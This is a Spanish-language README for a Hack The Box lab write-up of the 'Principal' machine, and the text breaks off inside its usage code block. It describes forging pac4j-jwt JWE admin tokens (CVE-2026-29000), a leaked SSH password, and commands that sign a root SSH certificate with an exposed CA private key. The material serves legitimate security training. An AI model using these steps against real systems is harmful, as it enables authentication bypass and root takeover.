<!-- Banner principal -->
<div align="center">
  <img src="./PRINCIPAL.png" alt="Principal HTB Machine Banner" width="800"/>
</div>

<!-- Badges de identificación -->
<div align="center">
  <img src="https://img.shields.io/badge/Status-Resuelto-brightgreen" alt="Status"/>
  <img src="https://img.shields.io/badge/Dificultad-Medium-yellow" alt="Difficulty"/>
  <img src="https://img.shields.io/badge/Plataforma-Hack%20The%20Box-blue" alt="Platform"/>
  <img src="https://img.shields.io/badge/Write--up%20by-Cosm3No1de-orange" alt="Author"/>
</div>

# 🔐 Principal – Hack The Box (Medium)

> **Write-up técnico completo de la máquina `Principal`**  
> Explotación de `CVE-2026-29000` (pac4j-jwt JWE forgery) + escalada a `root` mediante certificados SSH.

---

## 📋 Índice

- [Vista rápida](#-vista-rápida)
- [¿Qué problema resuelve este repositorio?](#-qué-problema-resuelve-este-repositorio)
- [Tecnologías utilizadas](#-tecnologías-utilizadas)
- [Instalación y uso](#-instalación--uso)
- [Flags obtenidas](#-flags-obtenidas)
- [Lecciones aprendidas](#-lecciones-aprendidas)
- [Contacto](#-contacto)

---

## 🎯 Vista rápida

| Fase | Técnica principal |
|------|-------------------|
| 🔍 Enumeración | `nmap` → puerto `8080` abierto, servidor **Jetty** con cabecera `X-Powered-By: pac4j-jwt/6.0.3` |
| 🚪 Bypass de autenticación | Forja de token **JWE** con rol `ROLE_ADMIN` usando la clave pública JWKS (`/api/auth/jwks`) |
| 🔑 Acceso inicial | Credencial en texto plano `D3pl0y_$$H_Now42!` → acceso SSH como usuario `svc-deploy` |
| 👑 Escalada de privilegios | Abuso de **CA SSH**: clave privada en `/opt/principal/ssh/ca` → firma de certificado para `root` |

---

## 🧠 ¿Qué problema resuelve este repositorio?

Este repositorio demuestra competencias profesionales en:

- Reconocimiento de servicios web y detección de versiones vulnerables.
- Manipulación de tokens **JWT/JWE** y explotación de `CVE-2026-29000`.
- Extracción de credenciales sensibles desde endpoints de API autenticados.
- Uso de **certificados SSH** y mala configuración de una **Autoridad de Certificación (CA)** para escalar a `root`.

---

## 🛠️ Tecnologías utilizadas

| Herramienta / Librería | Propósito |
|------------------------|-----------|
| `nmap` | Escaneo de puertos y detección de servicios |
| `curl`, `jq` | Interacción con la API y parseo de JSON |
| `Python 3` + `jwcrypto`, `PyJWT`, `requests` | Forja del token JWE malicioso |
| `OpenSSH` (cliente/servidor) | Autenticación por certificado y escalada de privilegios |
| `gobuster`, `dirsearch` (opcional) | Enumeración de directorios ocultos |

---

## 📦 Instalación / Uso

```bash
# 1. Clona el repositorio
git clone https://github.com/Cosm3No1de/principal-htb.git
cd principal-htb

# 2. Instala las dependencias de Python
pip install -r requirements.txt

# 3. Ejecuta el script de forja de token JWE
python3 forge_jwe.py --url http://principal.htb:8080

# 4. Con la contraseña obtenida, conéctate por SSH y escala a root
ssh svc-deploy@principal.htb
# Contraseña: D3pl0y_$$H_Now42!

# Dentro de la máquina (pasos resumidos):
cd /opt/principal/ssh
ssh-keygen -t rsa -b 4096 -f /tmp/rootkey -N ""
ssh-keygen -s ca -I "exploit" -n root /tmp/rootkey.pub
ssh -i /tmp/rootkey root@localhost
